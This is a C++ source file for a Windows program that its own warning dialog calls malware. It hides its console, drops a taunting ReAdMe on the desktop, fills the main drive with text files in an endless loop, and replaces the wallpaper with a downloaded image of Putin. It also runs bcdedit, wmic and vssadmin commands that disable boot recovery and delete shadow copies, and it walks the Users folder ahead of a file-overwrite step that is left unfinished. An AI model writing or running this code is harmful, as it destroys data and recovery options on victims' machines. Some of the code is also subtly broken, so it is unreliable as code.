#include <iostream>
#include <Windows.h>
#include <ShlObj.h>
#include <wininet.h>
#include <fstream>
#include <string.h>
#include <string>
#include <thread>
#include <Urlmon.h>

#define MAX_PATH 260
#pragma warning(disable : 4996)
#pragma comment(lib,"Wininet.lib")
#pragma comment(lib,"urlmon.lib")

using namespace std;

class Functionality {
private:
	HWND window;
	int result1;
	DWORD result2;
	char buffer1[MAX_PATH] = { 0 };
	char main_drive[MAX_PATH] = { 0 };

	void get_main_drive() {
		result2 = GetLogicalDriveStringsA(MAX_PATH, buffer1);

		if (result2 > 0 && result2 <= MAX_PATH) {
			char* current_drive = buffer1;
			while (*current_drive) {
				if (GetDriveTypeA(current_drive) == DRIVE_FIXED && main_drive[0] == '\0') {
					strcpy(main_drive, current_drive);

					return;
				}
				current_drive += strlen(current_drive) + 1;
			}
		}
	}

	bool dirExists(const string& dirName_in) {
		DWORD ftyp = GetFileAttributesA(dirName_in.c_str());
		if (ftyp == INVALID_FILE_ATTRIBUTES)
			return false;

		if (ftyp & FILE_ATTRIBUTE_DIRECTORY)
			return true;

		return false;
	}
	void DisableAndWipe() {
		const char* commands[5] = { "cmd.exe /c bcdedit /set {default} recoveryenabled no", "cmd.exe /c bcdedit /set {default} bootstatuspolicy ignoreallfailures", "cmd.exe /c wmic shadowcopy delete","cmd.exe /c vssadmin delete shadows /quiet /all" };

		for (int i = 0; i < 5; i++) {
			STARTUPINFOA si = { sizeof(STARTUPINFOA) };
			PROCESS_INFORMATION pi;

			CreateProcessA(NULL, (LPSTR)commands[i], NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

			WaitForSingleObject(pi.hProcess, INFINITE);

			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
		}
	}

	void ListFiles(const string& path) {
		WIN32_FIND_DATAA findFileData;
		HANDLE hFind = INVALID_HANDLE_VALUE;

		string searchPath = path + "\\*";

		hFind = FindFirstFileA(searchPath.c_str(), &findFileData);

		if (hFind == INVALID_HANDLE_VALUE) {
			cerr << "FindFirstFile failed for " << path << endl;
			return;
		}

		do {
			if (strcmp(findFileData.cFileName, ".") != 0 && strcmp(findFileData.cFileName, "..") != 0) {
				string newPath = path + "\\" + findFileData.cFileName;

				if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
					cout << "Directory: " << newPath << endl;
					ListFiles(newPath);  
				}
				else {
					cout << "File: " << newPath << endl;
				}
			}
		} while (FindNextFileA(hFind, &findFileData) != 0);

		FindClose(hFind);
	}
	
public:
	Functionality() {
		AllocConsole();

		window = FindWindowA("ConsoleWindowClass", NULL);
		ShowWindow(window, 0);
	}

	int warning() {
		result1 = MessageBoxA(NULL, "Are you sure you want to run this malware?", "Warning...", MB_YESNO | MB_ICONWARNING);

		if (result1 == 6) {
			return 0;
		}
		else {
			return 1;
		}
	}

	void forkbomb() {
		int count = 1;
		get_main_drive();


		while (true) {
			string File_Name = "PutinIsCool";
			string the_string(main_drive);

			the_string.append(File_Name);

			the_string.append(to_string(count));
			the_string.append(".txt");


			ofstream TheFile(the_string);

			TheFile.close();

			ofstream AppendFile(the_string, ios::app);

			if (AppendFile.is_open()) {
				for (int i = 0; i < 1000; i++) {
					AppendFile << "Putin is the coolest guy ever!\n";
				}

				AppendFile.close();
			}
			count++;
		}
	}

	void wallpaper_func() {
		get_main_drive();
		string FolderName = "\\PutinImage";
		string dup = main_drive;
		dup.pop_back();
		dup += FolderName;

		if (!dirExists(dup)) {
			CreateDirectoryA(dup.c_str(), NULL);
		}

		const char* imageUrl = "https://wegotthiscovered.com/wp-content/uploads/2022/12/vladimir-putin.jpg";

		std::string imagePath = dup + "\\vladimir-putin.jpg";

		URLDownloadToFileA(NULL, imageUrl, imagePath.c_str(), 0, NULL);

		const char* imagePathConst = imagePath.c_str();

		SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void*)imagePathConst, SPIF_UPDATEINIFILE);
	}
	
	void Desktop_Op() {
		PWSTR DesktopPath = NULL;
		SHGetKnownFolderPath(FOLDERID_Desktop, 0, NULL, &DesktopPath);

		int size_needed = WideCharToMultiByte(CP_ACP, 0, DesktopPath, -1, NULL, 0, NULL, NULL);

		char* asciiStr = new char[size_needed];

		WideCharToMultiByte(CP_ACP, 0, DesktopPath, -1, asciiStr, size_needed, NULL, NULL);

		string FolderPathA = string(asciiStr);

		delete[] asciiStr;

		CoTaskMemFree(DesktopPath);
		DesktopPath = nullptr;

		FolderPathA += "\\ReAdMe.txt";

		ofstream TheReadMeFile(FolderPathA);

		TheReadMeFile << "I suggest you take a look at your wallpaper, and main drive. :)";
		TheReadMeFile.close();

		ShellExecuteA(NULL, "open", "notepad.exe", FolderPathA.c_str(), NULL, SW_SHOWMAXIMIZED);
	}
	
	
	void overwrite_files() {
		DisableAndWipe();
		get_main_drive();

		string dup(main_drive);
		dup += "Users";

		ListFiles(dup);
	

		/* Later gonna be added */

	}
};

int main() {
	char url[128];

	strcat(url, "https://stackoverflow.com/");

	BOOL bConnect = InternetCheckConnectionA(url, FLAG_ICC_FORCE_CONNECTION, 0);

	if (!bConnect) {
		MessageBoxA(NULL, "Please run this program again, when you have stable connection.", "No Connection", MB_OK | MB_ICONHAND);
		return 1;
	}


	Functionality Obj;

	if (Obj.warning() == 1) {
		return 0;
	}

	Obj.Desktop_Op();
	thread fork_thread(&Functionality::forkbomb, &Obj);

	fork_thread.detach();

	Obj.wallpaper_func();
	Obj.overwrite_files();

	while (1) {}


	return 0;
}
